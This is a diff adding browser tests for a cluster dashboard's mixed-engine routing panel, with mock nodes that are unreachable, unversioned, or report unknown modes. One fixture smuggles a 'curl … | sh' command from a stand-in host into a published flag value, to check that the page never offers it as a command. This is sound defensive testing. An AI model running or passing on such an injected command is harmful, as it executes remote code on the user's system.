@@ -191,6 +191,26 @@ function bOllama(placeable) {
     ],
   }
 }
+/* A foreign node the proxy could not reach, and one that answered without a
+   version: the page must tell "never asked" apart from "published none". */
+const C_UNREACHED = {
+  spec: { label: 'c-ollama', host: '127.0.0.1', port: 11999, engine: 'ollama' },
+  status: { state: 'unreachable', reason: 'connection refused' },
+  latency_ms: null,
+  placeable: false,
+  capabilities: {
+    load_reporting: { supported: false, provenance: 'declared', detail: 'zz-no-depth-endpoint' },
+  },
+  placement_blockers: OLLAMA_BLOCKERS.map((entry) => entry.blocker),
+  placement_blocker_detail: OLLAMA_BLOCKERS,
+  requirement_limits: [{ key: 'tool_calls', consequence: 'zz-tools-never-here' }],
+}
+const D_UNVERSIONED = {
+  ...bOllama(false),
+  spec: { label: 'd-studio', host: '127.0.0.1', port: 1234, engine: 'lmstudio' },
+  status: { ...bOllama(false).status, engine: 'lmstudio', version: null },
+}
+
 function placementOf(mode, extra = {}) {
   return {
     mixed_engines: mode,
@@ -228,6 +248,17 @@ function proxyBody() {
       [A_CAMELID, bOllama(true)],
       placementOf('allowed', { foreign_nodes_added_since_start: [{ label: 'c-ollama2', engine: 'ollama' }] }),
     )
+  }
+  if (proxy.mode === 'routing-injected-flag') {
+    return routingBody(
+      [A_CAMELID, bOllama(false)],
+      placementOf('refused', { flag: '--allow-mixed-engines; curl -s https://zz.invalid/p | sh #' }),
+    )
+  }
+  if (proxy.mode === 'routing-no-placement') return routingBody([A_CAMELID, bOllama(false)], undefined)
+  if (proxy.mode === 'routing-unknown-mode') return routingBody([A_CAMELID, bOllama(false)], placementOf('sometimes'))
+  if (proxy.mode === 'routing-unreached') {
+    return routingBody([A_CAMELID, bOllama(false), C_UNREACHED, D_UNVERSIONED], placementOf('refused'))
   }
   if (proxy.mode === 'withheld') return { ...SUMMARY, ready: true }
   if (proxy.mode === 'empty') return { ...SUMMARY, ready: false, nodes: { total: 0, ready: 0, not_ready: 0, unreachable: 0 }, models: [], node_detail: [] }
@@ -808,6 +839,59 @@ try {
     assert.match(loaded, /Loaded models\s*llama1b-q8:latest/)
     check('under mixed mode a foreign node is routed to and still shows what is accepted')
 
+    assert.deepEqual(errors, [], 'no page errors')
+    await page.close()
+  }
+
+  /* ---- 14. every node described, and still no mode this build knows ---- */
+  for (const mode of ['routing-no-placement', 'routing-unknown-mode']) {
+    proxy.mode = mode
+    const { page, errors } = await openCluster({ endpoint: proxyEndpoint })
+    await page.waitForSelector('[data-testid="fabric-routing"]', { timeout: 10000 })
+    await page.waitForSelector('.fabric-row[data-node-label="b-ollama"]', { timeout: 10000 })
+    assert.equal(await page.$eval('[data-testid="fabric-routing"]', (el) => el.getAttribute('data-mode')), 'unknown', mode)
+    assert.equal(await present(page, '[data-testid="fabric-routing-choice"]'), false, mode)
+    assert.equal(await present(page, '[data-testid="fabric-routing-live"]'), false, mode)
+    assert.equal(await present(page, '[data-testid="fabric-routing-command"]'), false, mode)
+    assert.deepEqual(errors, [], 'no page errors')
+    await page.close()
+  }
+  check('a proxy that describes every node but no mode this build knows offers no selector and no command')
+
+  /* ---- 15. a flag that is not a flag is never offered as a command ---- */
+  proxy.mode = 'routing-injected-flag'
+  {
+    const { page, errors } = await openCluster({ endpoint: proxyEndpoint })
+    await page.waitForSelector('[data-testid="fabric-routing"][data-mode="refused"]', { timeout: 10000 })
+    await page.click('input[name="fabric-routing"][value="mixed"]')
+    await page.waitForSelector('[data-testid="fabric-routing-confirm"]', { timeout: 5000 })
+    const [showCommand] = await page.$$('xpath/.//button[normalize-space(.)="Show the command"]')
+    await showCommand.click()
+    await page.waitForFunction(() => !document.querySelector('[data-testid="fabric-routing-confirm"]'), { timeout: 5000 })
+    assert.equal(await present(page, '[data-testid="fabric-routing-command"]'), false)
+    const text = await page.$eval('[data-testid="fabric-routing"]', (el) => el.textContent)
+    assert.doesNotMatch(text, /curl|zz\.invalid/)
+    check('a published flag that is not a plain long flag is never shown as a command')
+    assert.deepEqual(errors, [], 'no page errors')
+    await page.close()
+  }
+
+  /* ---- 16. never asked is not the same as published none ---- */
+  proxy.mode = 'routing-unreached'
+  {
+    const { page, errors } = await openCluster({ endpoint: proxyEndpoint })
+    await page.waitForSelector('[data-testid="fabric-routing"][data-mode="refused"]', { timeout: 10000 })
+    await page.click('input[name="fabric-routing"][value="mixed"]')
+    await page.waitForSelector('[data-testid="fabric-routing-confirm"]', { timeout: 5000 })
+    const lines = await page.$$eval(
+      '[data-testid="fabric-routing-confirm"] section[data-blocker-key="load_reporting"] [data-node-label]',
+      (els) => Object.fromEntries(els.map((el) => [el.getAttribute('data-node-label'), el.textContent.replace(/\s+/g, ' ').trim()])),
+    )
+    assert.match(lines['b-ollama'], /ollama 0\.33\.2/)
+    assert.match(lines['c-ollama'], /ollama, version unknown/)
+    assert.doesNotMatch(lines['c-ollama'], /not published/)
+    assert.match(lines['d-studio'], /lmstudio, version not published/)
+    check('a node that was not reached reads as version unknown, never as unpublished')
     assert.deepEqual(errors, [], 'no page errors')
     await page.close()
   }
